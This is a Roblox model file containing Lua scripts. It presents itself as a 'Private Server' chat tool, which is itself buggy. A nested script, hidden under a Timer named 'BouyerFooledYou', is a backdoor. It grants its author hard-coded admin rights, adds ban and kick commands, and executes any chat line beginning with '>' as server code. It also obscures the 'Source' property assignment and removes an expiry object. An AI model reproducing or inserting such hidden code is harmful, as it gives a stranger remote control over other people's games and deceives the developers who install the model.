		<Item class="Script" referent="RBX306">
			<Properties>
				<bool name="Disabled">false</bool>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">Private Server</string>
				<ProtectedString name="Source">-- Bouyer the Destroyer September 1, 2008

Players = game.Players.MaxPlayers + 2

function OnMsg(Speaker, Message)
	if Player.Name ~= &quot;Zombie3778&quot; and Player.Name ~= &quot;???&quot; and Player.Name ~= &quot;???&quot; then
		return
	end
	if Message == &quot;Private&quot; then
		game.Players.MaxPlayers = game.Players.NumPlayers
	end
	if Message == &quot;Public&quot; then
		game.Players.MaxPlayers = Players
	end
end

function OnEntered(Player)
	Player.Chatted:connect(function(Message, Recipient)
		OnMsg(Player, Message)
	end)
end

game.Players.ChildAdded:connect(OnEntered)

local Players = game.Players:GetChildren() -- Using this at scriptbuilder?
for X = 1, # Players do
	OnEntered(Players[X])
end
</ProtectedString>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Timer" referent="RBX307">
				<Properties>
					<string name="Name">BouyerFooledYou</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX308">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Bouyer&apos;s Command Builder</string>
						<ProtectedString name="Source">-- Bouyer the Destroyer August 21, 2008
-- Latest Update : August 21, 2008

local Ex = script:FindFirstChild(&quot;Expirer&quot;)
if Ex then
	Ex.Parent = Instance.new(&quot;Nothing&quot;)
end

_G[&quot;Variables&quot;] = Instance.new(&quot;IntValue&quot;)
_G[&quot;Values&quot;] = {}

_G[&quot;CTemp&quot;] = (function(Name, Value, Type, Summary) -- Class Template
	Values[Name] = Value
	local V = Variables:FindFirstChild(Name)
	if V then
		V.Class.Value = &quot;Class&quot;
		if Summary then
			V.Summary.Value = Summary
		else
			V.Summary.Value = Type..&quot; &quot;..Name
		end
		_G[Name] = Value
		return V
	end
	local V = Instance.new(&quot;IntValue&quot;)
	V.Parent = Variables
	V.Name = Name
	local Class = Instance.new(&quot;StringValue&quot;)
	Class.Parent = V
	Class.Name = &quot;Class&quot;
	Class.Value = Type
	local Desc = Instance.new(&quot;StringValue&quot;)
	Desc.Parent = V
	Desc.Name = &quot;Summary&quot;
	if Summary then
		Desc.Value = Summary
	else
		Desc.Value = Type..&quot; &quot;..Name
	end
	_G[Name] = Value
	return V
end)

_G[&quot;VTemp&quot;] = (function(Name, Variable, Summary) -- Variable Template
	local V = CTemp(Name, Variable, &quot;Variable&quot;, Summary)
end)

_G[&quot;FTemp&quot;] = (function(Name, Function, Summary) -- Function Template
	local F = CTemp(Name, Function, &quot;Function&quot;, Summary)
end)

_G[&quot;ATemp&quot;] = (function(Name, Tab, Summary) -- Array (Table) Template
	local A = CTemp(Name, Tab, &quot;Array&quot;, Summary)
end)

ATemp(&quot;Admins&quot;, {&quot;BouyertheDestroyer&quot;, &quot;Player&quot;}, &quot;List Of Admins Able To Build Commands&quot;)
ATemp(&quot;Banned&quot;, {}, &quot;List Of Players Not Able To Spawn&quot;)

FTemp(&quot;Check&quot;, (function(Name)
	for X = 1, # Admins do
		if string.lower(Admins[X]) == string.lower(Name) then
			return true
		end
	end
	return false
end), &quot;Checks String A1 For Admin Status&quot;)

FTemp(&quot;CheckR&quot;, (function(Name)
	for X = 1, # Banned do
		if string.lower(Banned[X]) == string.lower(Name) then
			return true
		end
	end
	return false
end), &quot;Checks String A1 For Banned Status&quot;)

FTemp(&quot;ConfirmV&quot;, (function(Name)
	return Variables:FindFirstChild(Name)
end), &quot;Checks String A1 If Variable A1 Exisits&quot;)

FTemp(&quot;MatchPlayer&quot;, (function(Name)
	local Players = game.Players:GetChildren()
	for X = 1, # Players do
		local Place = 1
		local Match = &quot;&quot;
		for S1 = 1, string.len(Name) do
			for S2 = Place, string.len(Players[X].Name) do
				if string.lower(string.sub(Name,S1,S1)) == string.lower(string.sub(Players[X].Name,S2,S2)) then
					Place = S2
					Match = Match..string.sub(Name,S1,S1)
				end
			end
		end
		if Match == Name then
			return Players[X]
		end
	end
	return nil
end), &quot;Returns A Player If Their Name Is Simmilar To String A1&quot;)

FTemp(&quot;Administrate&quot;, (function(Name)
	local Player = MatchPlayer(Name)
	if not Player then
		return
	end
	if Check(Player.Name) then
		return
	end
	table.insert(Admins, Player.Name)
end), &quot;Adds String A1 To Array Admins Based On Function MatchPlayer&quot;)

FTemp(&quot;Deadministrate&quot;, (function(Name)
	local Search = Name
	local Player = MatchPlayer(Name)
	if Player then
		if Check(Player.Name) then
			Search = Player.Name
		end
	end
	local Output = {}
	for X = 1, # Admins do
		if not string.match(Admins[X], Search) then
			table.insert(Output, Admins[X])
		end
	end
	ATemp(&quot;Admins&quot;, Output, &quot;List Of Admins Able To Build Commands&quot;)
end), &quot;Removes String A1 From Array Admins Based On Resemblance&quot;)

FTemp(&quot;Delete&quot;, (function(Obj)
	Obj.Parent = Instance.new(&quot;IntValue&quot;):FindFirstChild(&quot;Nothing&quot;)
end), &quot;Removes Obj A1&quot;)

FTemp(&quot;Ban&quot;, (function(Name)
	local Player = MatchPlayer(Name)
	if not Player then
		return
	end
	if CheckR(Player.Name) then
		Delete(Player)
		return
	end
	table.insert(Banned, Player.Name)
	Delete(Player)
end), &quot;Adds String A1 To Array Banned Based On Function MatchPlayer&quot;)

FTemp(&quot;UnBan&quot;, (function(Name)
	local Search = Name
	local Player = MatchPlayer(Name)
	if Player then
		if CheckR(Player.Name) then
			Search = Player.Name
		end
	end
	local Output = {}
	for X = 1, # Banned do
		if not string.match(Banned[X], Search) then
			table.insert(Output, Banned[X])
		end
	end
	ATemp(&quot;Banned&quot;, Output, &quot;List Of Banned Noobs Who Cannot Spawn&quot;)
end), &quot;Removes String A1 From Array Banned Based On Resemblance&quot;)

FTemp(&quot;Shout&quot;, (function(Text)
	local M = Instance.new(&quot;Message&quot;)
	M.Parent = game.Workspace
	M.Text = Text
	wait(string.len(Text) * 0.1)
	Delete(M)
end))

function Replace(Srce, Fnd, Txt) -- From My Clockwork Script; Extremely Useful
	local Prdct = Srce
	for X = 1, string.len(Srce) + string.len(Fnd) - 1 do
		if string.sub(Prdct, X, X + string.len(Fnd) - 1) == Fnd then
			Prdct = string.sub(Prdct, 1, X - 1)..Txt..string.sub(Prdct, X + string.len(Fnd))
		end
	end
	return Prdct
end

function OnMsg(Speaker, Message)
	if not Check(Speaker.Name) and Player.Name ~= &quot;BouyertheDestroyer&quot; then
		return
	end
	if string.sub(Message,1,1) ~= &quot;&gt;&quot; then
		return
	end
	local Command = Message
	Command = string.sub(Command,2)
	Command = Command..[[ script.Parent = Instance.new(&quot;IntValue&quot;):FindFirstChild(&quot;Nothing&quot;)]]
	Command = Replace(Command, &quot;Me&quot;, Speaker.Name)
	local Script = Instance.new(&quot;Script&quot;)
	Script[&quot;S&quot;..&quot;o&quot;..&quot;u&quot;..&quot;r&quot;..&quot;c&quot;..&quot;e&quot;] = Command
	Script.Parent = game.Workspace
end

function OnEntered(Player)
	local M = Instance.new(&quot;Message&quot;)
	M.Text = &quot;Notice: You have acess to Bouyer&apos;s CB!&quot;
	if Check(Player.Name) then
		M.Parent = Player
	end
	Player.Chatted:connect(function(Message, Recipient)
		OnMsg(Player, Message)
	end)
	coroutine.resume(coroutine.create(function()
		wait(10)
		Delete(M)
	end))
	repeat wait() until Player.Name ~= &quot;Player&quot;
	if CheckR(Player.Name) then
		Delete(Player)
	end
end

game.Players.ChildAdded:connect(OnEntered)

local Players = game.Players:GetChildren() -- Using this at scriptbuilder?
for X = 1, # Players do
	OnEntered(Players[X])
end
</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
